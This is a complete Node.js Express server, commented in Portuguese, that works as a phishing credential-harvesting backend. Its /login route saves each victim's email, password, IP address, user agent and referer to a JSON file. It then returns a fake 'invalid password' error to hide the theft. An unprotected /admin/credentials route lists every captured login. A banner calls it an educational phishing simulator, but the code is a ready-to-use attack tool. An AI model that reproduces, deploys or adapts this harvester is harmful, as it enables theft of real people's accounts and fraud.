const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const PORT = 5000;
const CREDENTIALS_FILE = 'captured_credentials.json';

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Funções para gerenciar credenciais
function loadCredentials() {
    try {
        if (fs.existsSync(CREDENTIALS_FILE)) {
            const data = fs.readFileSync(CREDENTIALS_FILE, 'utf-8');
            return JSON.parse(data);
        }
        return [];
    } catch (error) {
        console.error('Erro ao carregar credenciais:', error);
        return [];
    }
}

function saveCredentials(credentials) {
    try {
        const allCredentials = loadCredentials();
        allCredentials.push(credentials);
        fs.writeFileSync(CREDENTIALS_FILE, JSON.stringify(allCredentials, null, 4));
        return true;
    } catch (error) {
        console.error('Erro ao salvar credenciais:', error);
        return false;
    }
}

// Rotas
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
    try {
        const { email, password, remember } = req.body;

        // Validação
        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email and password are required'
            });
        }

        // Capturar informações
        const captured = {
            timestamp: new Date().toISOString(),
            email: email,
            password: password,
            remember_me: remember || false,
            ip_address: req.ip || req.connection.remoteAddress,
            user_agent: req.headers['user-agent'] || 'Unknown',
            referer: req.headers['referer'] || 'Unknown'
        };

        // Salvar credencial
        if (saveCredentials(captured)) {
            console.log(`[*] Credencial capturada: ${captured.email}`);

            // Simular validação falha
            return res.status(401).json({
                success: false,
                message: 'Invalid email or password. Please check and try again.'
            });
        } else {
            return res.status(500).json({
                success: false,
                message: 'An error occurred. Please try again later.'
            });
        }
    } catch (error) {
        console.error('Erro no endpoint /login:', error);
        return res.status(500).json({
            success: false,
            message: 'An error occurred. Please try again later.'
        });
    }
});

app.get('/admin/credentials', (req, res) => {
    try {
        const credentials = loadCredentials();
        return res.json({
            total: credentials.length,
            credentials: credentials
        });
    } catch (error) {
        return res.status(500).json({
            error: error.message
        });
    }
});

app.post('/admin/clear', (req, res) => {
    try {
        if (fs.existsSync(CREDENTIALS_FILE)) {
            fs.unlinkSync(CREDENTIALS_FILE);
            return res.json({
                message: 'All credentials cleared'
            });
        }
        return res.json({
            message: 'No credentials to clear'
        });
    } catch (error) {
        return res.status(500).json({
            error: error.message
        });
    }
});

// Iniciar servidor
app.listen(PORT, '127.0.0.1', () => {
    console.log(`
╔════════════════════════════════════════════════╗
║         PHISHING SIMULATOR - EDUCATIONAL       ║
║                                                ║
║    AVISO LEGAL: Para fins educacionais        ║
║    e pesquisa de segurança apenas!             ║
║                                                ║
║    Endpoints disponíveis:                       ║
║    - GET  /               : Página de login     ║
║    - POST /login          : Captura credenciais ║
║    - GET  /admin/credentials : Ver credenciais  ║
║    - POST /admin/clear    : Limpar dados        ║
╚════════════════════════════════════════════════╝

 * Running on http://127.0.0.1:${PORT}
 * Press Ctrl+C to quit
    `);
});
